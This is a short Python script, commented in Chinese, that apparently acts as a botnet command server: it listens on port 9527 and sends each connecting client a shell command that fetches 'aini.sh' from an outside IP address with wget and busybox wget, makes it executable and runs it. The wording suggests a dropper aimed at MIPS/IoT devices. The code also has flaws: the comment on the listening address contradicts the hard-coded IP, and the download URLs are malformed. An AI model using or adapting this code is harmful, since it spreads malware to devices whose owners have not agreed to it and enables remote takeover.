import socket

HOST = '95.214.55.17'   # 表示监听所有可用的接口
PORT = 9527 # 监听的端口号，可以根据需要进行更改

def main():
    # 创建 TCP 套接字
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # 绑定监听地址和端口号
    server_socket.bind((HOST, PORT))
    
    # 开始监听
    server_socket.listen(1)
    
    print('等待客户端连接...')
    
    while True:
        # 接受客户端的连接请求
        client_socket, client_addr = server_socket.accept()
        print(f'客户端 {client_addr} 连接成功！')
        
        # 发送指令
        command = "cd /tmp; rm -rf mips; wget http://http://165.22.2.18/aini.sh; busybox wget http://http://165.22.2.18/aini.sh;chmod 777 aini.sh; sh aini.sh;ls & \n"
        client_socket.sendall(command.encode())
        
        # 关闭客户端套接字
        client_socket.close()

if __name__ == '__main__':
    main()
